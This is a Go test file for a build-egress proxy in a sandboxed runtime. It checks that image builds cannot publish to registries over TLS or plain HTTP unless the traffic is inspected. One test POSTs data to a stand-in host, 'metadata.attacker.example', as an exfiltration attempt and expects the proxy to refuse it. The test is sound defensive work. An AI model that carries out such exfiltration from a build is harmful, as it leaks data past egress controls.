package egress

import (
	"strings"
	"testing"
	"time"

	"github.com/kodustech/kodus-ai/apps/runtime-cell/internal/policy"
)

// buildRig is the rig with its one source as the claim's image builder and
// registry.example an allowed, inspected registry.
func buildRig(t *testing.T, passthrough []string) *inspectRig {
	t.Helper()
	r := newInspectRig(t, nil)
	pol, _ := r.store.ForClaim("claim-1")
	pol.BuildSources, pol.BuildPassthrough, pol.IssuedAt = []string{"127.0.0.1"}, passthrough, time.Now()
	if err := r.store.Put(pol); err != nil {
		t.Fatal(err)
	}
	return r
}

// G1 from a build: a Dockerfile RUN npm publish is a PUT over TLS to an
// allowed registry, which the builder (no cell CA in its RUN steps) used to
// reach as SNI passthrough, counted as an inspection bypass. It is refused
// now, and the bypass counter stays at zero.
func TestG1ABuildCannotReachAnAllowedRegistryOverTLS(t *testing.T) {
	r := buildRig(t, nil)
	if _, err := r.tlsGet("registry.example"); err == nil {
		t.Fatal("the build reached the registry over TLS: a RUN npm publish would go out")
	}
	if got := r.lastReason(t); got != policy.BuildNeedsInspection {
		t.Fatalf("reason %s", got)
	}
	if n := r.proxy.Metrics.InspectBypassed(); n != 0 {
		t.Fatalf("bypassed %d", n)
	}
	select {
	case line := <-r.injected:
		t.Fatalf("sent to the injector: %s", line)
	default:
	}
}

// A read-only CDN (or a host an owner gave full access) is the build's
// passthrough: it goes out, and it is no inspection bypass.
func TestABuildReachesItsPassthroughHostsAndCountsNoBypass(t *testing.T) {
	r := buildRig(t, []string{"registry.example"})
	body, err := r.tlsGet("registry.example")
	if err != nil || body != "upstream registry.example" {
		t.Fatalf("%q %v", body, err)
	}
	if n := r.proxy.Metrics.InspectBypassed(); n != 0 {
		t.Fatalf("bypassed %d", n)
	}
}

// Plain HTTP from a build: an inspected host's rule decides (GET under its
// paths), a host without one is refused like TLS.
func TestABuildOverPlainHTTPMeetsTheInspectedRuleOrIsRefused(t *testing.T) {
	r := buildRig(t, nil)
	if body, err := r.plain(t, "GET", "registry.example", "/pkg/a.tgz", ""); err != nil || body != "plain registry.example" {
		t.Fatalf("GET: %q %v", body, err)
	}
	if _, err := r.plain(t, "PUT", "registry.example", "/pkg/a", "{}"); err == nil {
		t.Fatal("a PUT went out")
	}
	if got := r.lastReason(t); got != policy.InspectMethod {
		t.Fatalf("reason %s", got)
	}
	if _, err := r.plain(t, "POST", "metadata.attacker.example", "/x", "data"); err == nil {
		t.Fatal("plain HTTP to an uninspected host went out from the build")
	}
	if got := r.lastReason(t); got != policy.BuildNeedsInspection {
		t.Fatalf("reason %s", got)
	}
}

// trustedBuildRig is buildRig with the builder an inspect source: its RUN
// steps trust the cell CA (builder-image/exec-ca-bundle.patch).
func trustedBuildRig(t *testing.T, passthrough []string) *inspectRig {
	t.Helper()
	r := buildRig(t, passthrough)
	pol, _ := r.store.ForClaim("claim-1")
	pol.InspectSources, pol.IssuedAt = []string{"127.0.0.1"}, time.Now()
	if err := r.store.Put(pol); err != nil {
		t.Fatal(err)
	}
	return r
}

// A builder that trusts the cell CA sends its TLS to an allowed, inspected
// registry to the injector, which lets only reads under the paths out (a RUN
// npm publish is refused there, injector/inspect_test.go): a repository's own
// Dockerfile installs without the mirror's build args. It used to be refused
// at the proxy (build_needs_inspection). No bypass is counted.
func TestATrustedBuildReachesAnInspectedRegistryThroughTheInjector(t *testing.T) {
	r := trustedBuildRig(t, nil)
	_, _ = r.tlsGet("registry.example")
	select {
	case line := <-r.injected:
		if !strings.HasPrefix(line, "PROXY TCP4 127.0.0.1 127.0.0.1 ") {
			t.Fatalf("PROXY line %q", line)
		}
	case <-time.After(3 * time.Second):
		t.Fatalf("the trusted build's TLS to the registry did not reach the injector: %s", r.lastReason(t))
	}
	if n := r.proxy.Metrics.InspectBypassed(); n != 0 {
		t.Fatalf("bypassed %d", n)
	}
}

// A trusted builder's passthrough host keeps going straight out, inspected
// rule or not: apt over HTTPS (which ignores the trust variables) still reaches
// a package mirror, and no bypass is counted.
func TestATrustedBuildReachesItsPassthroughHostsStraight(t *testing.T) {
	r := trustedBuildRig(t, []string{"registry.example"})
	body, err := r.tlsGet("registry.example")
	if err != nil || body != "upstream registry.example" {
		t.Fatalf("%q %v", body, err)
	}
	select {
	case line := <-r.injected:
		t.Fatalf("sent to the injector: %s", line)
	default:
	}
	if n := r.proxy.Metrics.InspectBypassed(); n != 0 {
		t.Fatalf("bypassed %d", n)
	}
}
